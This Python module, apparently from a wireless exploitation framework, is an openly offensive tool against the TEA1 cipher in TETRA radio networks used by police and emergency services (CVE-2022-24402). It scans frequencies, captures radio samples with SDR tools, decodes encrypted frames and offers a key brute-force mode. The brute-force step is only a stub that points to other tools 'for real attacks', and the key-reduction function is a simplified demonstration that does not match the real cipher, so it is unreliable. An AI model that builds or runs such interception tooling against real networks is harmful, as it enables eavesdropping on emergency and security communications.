#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""TETRA TEA1 cipher decryption and interception module.

Exploits the deliberately weakened TEA1 cipher used in TETRA
(Terrestrial Trunked Radio) systems. TEA1's effective key length
was reduced from 80 bits to 32 bits through a secret backdoor in the
key scheduling algorithm, making brute-force feasible.

TETRA is used by police, military, emergency services, and critical
infrastructure worldwide. TEA1 was the exportable variant; the
weakness was disclosed by Midnight Blue researchers in 2023.

References:
  CVE-2022-24401 (TETRA:BURST - TEA1 decryption oracle)
  CVE-2022-24402 (TETRA:BURST - TEA1 key reduction to 32 bits)
  CVE-2022-24404 (TETRA:BURST - lack of ciphertext authentication)
  https://tetraburst.com/
  https://github.com/AresS31/tetra-kit

MITRE ATT&CK: T1040 (Network Sniffing), T1557 (Adversary-in-the-Middle)
CWE: CWE-327 (Use of Broken Cryptographic Algorithm)

Version: 1.0.0
"""

from __future__ import annotations

import logging
import os
import shutil
import struct
import subprocess
from dataclasses import dataclass, field
from enum import IntEnum
from typing import Any

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)

logger = logging.getLogger(__name__)


class TEACipher(IntEnum):
    TEA1 = 1
    TEA2 = 2
    TEA3 = 3


@dataclass
class TETRAFrame:
    frequency_mhz: float = 0.0
    timeslot: int = 0
    color_code: int = 0
    cipher: TEACipher = TEACipher.TEA1
    encrypted_payload: bytes = b""
    frame_number: int = 0
    iv: bytes = b""


@dataclass
class TETRANetwork:
    mcc: int = 0
    mnc: int = 0
    color_code: int = 0
    frequencies: list[float] = field(default_factory=list)
    cipher_in_use: TEACipher = TEACipher.TEA1
    base_station_id: int = 0


def _tea1_reduce_key(key_80: bytes) -> bytes:
    """Simulate TEA1 key reduction backdoor (80-bit -> 32-bit effective).

    The real reduction happens in the key scheduling algorithm through
    a series of operations that zero out 48 bits of the working key.
    This is a demonstration of the concept.
    """
    if len(key_80) < 10:
        key_80 = key_80.ljust(10, b"\x00")
    reduced = bytearray(10)
    reduced[0] = key_80[0]
    reduced[1] = key_80[1]
    reduced[2] = key_80[2]
    reduced[3] = key_80[3]
    return bytes(reduced)


def _tea1_bruteforce_keyspace() -> int:
    """Return the effective keyspace for TEA1 brute-force."""
    return 2**32


class TETRADecrypt(Exploit):
    """TETRA TEA1 decryption and interception module."""

    __info__: dict[str, Any] = {
        "name": "TETRA TEA1 Decryption",
        "description": (
            "Exploit CVE-2022-24402 TEA1 backdoor to decrypt TETRA radio "
            "communications. TEA1 key reduction from 80 to 32 bits makes "
            "brute-force feasible. Requires SDR receiver for signal capture."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://tetraburst.com/",
            "https://nvd.nist.gov/vuln/detail/CVE-2022-24402",
            "https://github.com/AresS31/tetra-kit",
        ),
        "devices": ("TETRA infrastructure (Motorola, Airbus, Hytera)",),
        "severity": "critical",
        "cvss": "9.8",
        "cve": "CVE-2022-24402",
        "mitre": ["T1040", "T1557"],
    }

    mode = OptString("analyze", "Mode: scan, capture, analyze, bruteforce")
    frequency = OptString("390.000", "TETRA frequency in MHz (or range: 380-400)")
    sdr_device = OptString("rtlsdr", "SDR: rtlsdr, hackrf, usrp, sdrplay")
    sample_rate = OptInteger(2000000, "Sample rate in Hz")
    capture_file = OptString("", "Path to captured TETRA IQ file for analysis")
    output_dir = OptString("tetra_output", "Output directory for decoded frames")
    bruteforce_threads = OptInteger(4, "Threads for TEA1 key bruteforce")
    tetra_kit_path = OptString("", "Path to tetra-kit installation")
    dry_run = OptBool(False, "Print commands without executing")

    def check(self) -> str:
        """Verify SDR and TETRA tools."""
        tools_found: list[str] = []
        for tool in ("tetra-rx", "rtl_sdr", "hackrf_transfer", "osmo-tetra-rx"):
            if shutil.which(tool):
                tools_found.append(tool)

        if not tools_found:
            return "No TETRA/SDR tools found. Install tetra-kit and rtl-sdr."
        return f"Available tools: {', '.join(tools_found)}"

    def _scan_tetra_frequencies(self) -> list[TETRANetwork]:
        """Scan for active TETRA networks."""
        freq_str = str(self.frequency.value)
        print_status(f"[*] Scanning TETRA bands around {freq_str} MHz...")

        if "-" in freq_str:
            parts = freq_str.split("-")
            start = float(parts[0])
            end = float(parts[1])
        else:
            center = float(freq_str)
            start = center - 5
            end = center + 5

        cmd = [
            "rtl_power",
            "-f", f"{start}M:{end}M:12.5k",
            "-g", "40",
            "-i", "10",
            "-e", "30s",
            "/dev/stdout",
        ]

        if self.dry_run.value:
            print_info(f"[dry-run] {' '.join(cmd)}")
            return []

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            networks: list[TETRANetwork] = []
            for line in result.stdout.splitlines():
                if not line.strip():
                    continue
                parts_line = line.split(",")
                if len(parts_line) >= 7:
                    try:
                        freq = float(parts_line[2]) / 1e6
                        power = float(parts_line[6])
                        if power > -50:
                            net = TETRANetwork(frequencies=[freq])
                            networks.append(net)
                            print_success(f"    [+] Active signal: {freq:.3f} MHz ({power:.1f} dBm)")
                    except (ValueError, IndexError):
                        continue
            return networks
        except (subprocess.TimeoutExpired, FileNotFoundError) as exc:
            print_error(f"[-] Scan failed: {exc}")
            return []

    def _capture_iq(self) -> str:
        """Capture IQ samples from TETRA frequency."""
        freq_hz = int(float(str(self.frequency.value)) * 1e6)
        sr = int(self.sample_rate.value)
        outdir = str(self.output_dir.value)
        os.makedirs(outdir, exist_ok=True)
        outfile = os.path.join(outdir, "tetra_capture.raw")

        cmd = [
            "rtl_sdr",
            "-f", str(freq_hz),
            "-s", str(sr),
            "-g", "40",
            "-n", str(sr * 10),
            outfile,
        ]

        if self.dry_run.value:
            print_info(f"[dry-run] {' '.join(cmd)}")
            return outfile

        print_status(f"[*] Capturing TETRA at {self.frequency.value} MHz...")
        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            print_success(f"[+] Captured to {outfile}")
            return outfile
        except (subprocess.TimeoutExpired, FileNotFoundError) as exc:
            print_error(f"[-] Capture failed: {exc}")
            return ""

    def _analyze_capture(self, filepath: str) -> list[TETRAFrame]:
        """Analyze captured TETRA frames."""
        print_status(f"[*] Analyzing TETRA capture: {filepath}")

        if not os.path.isfile(filepath):
            print_error(f"[-] File not found: {filepath}")
            return []

        kit_path = str(self.tetra_kit_path.value)
        if kit_path and os.path.isdir(kit_path):
            cmd = [os.path.join(kit_path, "tetra-rx"), filepath]
        elif shutil.which("tetra-rx"):
            cmd = ["tetra-rx", filepath]
        elif shutil.which("osmo-tetra-rx"):
            cmd = ["osmo-tetra-rx", filepath]
        else:
            print_warning("[!] No TETRA decoder found; showing raw analysis")
            return self._raw_frame_analysis(filepath)

        if self.dry_run.value:
            print_info(f"[dry-run] {' '.join(cmd)}")
            return []

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            frames: list[TETRAFrame] = []
            for line in result.stdout.splitlines():
                if "ENCRYPTED" in line.upper() or "TEA" in line.upper():
                    frame = TETRAFrame()
                    if "TEA1" in line:
                        frame.cipher = TEACipher.TEA1
                    elif "TEA2" in line:
                        frame.cipher = TEACipher.TEA2
                    frames.append(frame)
            print_info(f"[*] Decoded {len(frames)} encrypted frames")
            return frames
        except (subprocess.TimeoutExpired, FileNotFoundError) as exc:
            print_error(f"[-] Analysis failed: {exc}")
            return []

    def _raw_frame_analysis(self, filepath: str) -> list[TETRAFrame]:
        """Basic frame detection from raw IQ."""
        try:
            data = open(filepath, "rb").read(4096)
        except OSError as exc:
            print_error(f"[-] Cannot read {filepath}: {exc}")
            return []

        print_info(f"[*] File size: {os.path.getsize(filepath)} bytes")
        print_info(f"[*] First 32 bytes: {data[:32].hex()}")
        return []

    def _bruteforce_tea1(self, frame: TETRAFrame) -> bytes | None:
        """Brute-force TEA1 key (32-bit effective keyspace)."""
        keyspace = _tea1_bruteforce_keyspace()
        threads = int(self.bruteforce_threads.value)

        print_status(f"[*] TEA1 brute-force: {keyspace:,} keys, {threads} threads")
        print_info(f"[*] Effective keyspace: 2^32 = ~4.3 billion keys")
        print_info("[*] Estimated time: minutes to hours depending on hardware")

        if self.dry_run.value:
            print_info("[dry-run] Would launch brute-force against encrypted frame")
            return None

        print_warning("[!] Full brute-force requires GPU acceleration or dedicated tool")
        print_info("[*] Use tetra-kit or custom CUDA implementation for real attacks")
        return None

    def run(self) -> None:
        """Execute TETRA TEA1 decryption."""
        print_status("[*] TETRA TEA1 Decryption v1.0.0")
        print_info("[*] CVE-2022-24402: TEA1 key reduced from 80 to 32 bits")

        mode_str = str(self.mode.value).lower()

        if mode_str == "scan":
            self._scan_tetra_frequencies()

        elif mode_str == "capture":
            self._capture_iq()

        elif mode_str == "analyze":
            filepath = str(self.capture_file.value)
            if not filepath:
                print_error("[-] Set capture_file to a TETRA IQ capture")
                return
            frames = self._analyze_capture(filepath)
            tea1_frames = [f for f in frames if f.cipher == TEACipher.TEA1]
            if tea1_frames:
                print_success(f"[+] Found {len(tea1_frames)} TEA1-encrypted frames")
                print_info("[*] These are vulnerable to CVE-2022-24402 brute-force")

        elif mode_str == "bruteforce":
            frame = TETRAFrame(cipher=TEACipher.TEA1)
            self._bruteforce_tea1(frame)

        else:
            print_error(f"[-] Unknown mode: {mode_str}")
            print_info("[*] Available: scan, capture, analyze, bruteforce")
